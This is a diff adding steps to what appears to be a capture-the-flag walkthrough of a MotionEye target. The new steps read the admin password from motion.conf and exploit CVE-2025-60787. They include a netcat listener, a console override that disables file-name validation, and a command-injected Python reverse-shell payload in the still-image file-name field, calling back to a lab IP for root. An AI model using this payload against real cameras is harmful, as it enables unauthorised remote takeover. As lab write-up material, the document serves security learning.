@@ -371,8 +371,33 @@ which is the same `$(touch /tmp/test).%Y-%m-%d-%H-%M-%S` that i found inside of 
 
 …i need to get admin.
 
+## Motioneye admin password
 googling a bit, it seems the admin password is stored as a sha1 password inside `/etc/motioneye/motion.conf`. How secure.
 
 using hashcat to crack the password. It is not regular sha1 so i will try some candidates.
 
 All candidates do not hit the password when using rockyou, so i might need to try some other kinda table.
+
+The password might be a personalized one based on some factors, so lets use a custom word list generator like [cewl](https://www.kali.org/tools/cewl/). But alas, the output isnt really that helpful so i might just look into some other table.
+
+I tried the rainbow table that [crackstation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm) uses, but even that one does not work??
+
+OK. i um. so. it’s not a hash. The hash i found…IS the password.
+
+I’m. I’m in.
+
+## Motioneye admin page
+Looking at the [exploit](https://www.exploit-db.com/exploits/52481) poc of [cve-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787).
+
+- run `nc -lvnp 5555` inside your own terminal
+- Open the motioneye dashboard.
+- Run `configUiValid = function() { return true; };` in the console.
+	- This wil ldisable validation of text input for file names.
+- Open the side bar > still images
+	- File name: `$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")').%Y-%m-%d-%H-%M-%S`
+		- This will send a revshell connection to my ip
+- hover over the camera and take a manual snapshop
+
+AAAAND that’s it folks. root acces.
+
+yippiee
